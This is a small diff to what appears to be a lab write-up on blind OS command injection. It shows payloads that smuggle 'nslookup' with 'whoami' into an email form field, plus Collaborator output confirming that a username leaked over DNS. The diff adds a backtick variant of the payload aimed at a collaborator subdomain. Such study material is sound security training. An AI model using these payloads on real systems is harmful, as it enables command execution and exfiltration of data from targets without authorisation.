@@ -72,3 +72,8 @@ email=test%40t||nslookup+$(whoami).COLLAB.oastify.com||
 
 The Collaborator server received a DNS lookup of type A for the domain name peter-GOnvHP.COLLAB.oastify.com.
 ```
+
+or 
+```
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+```
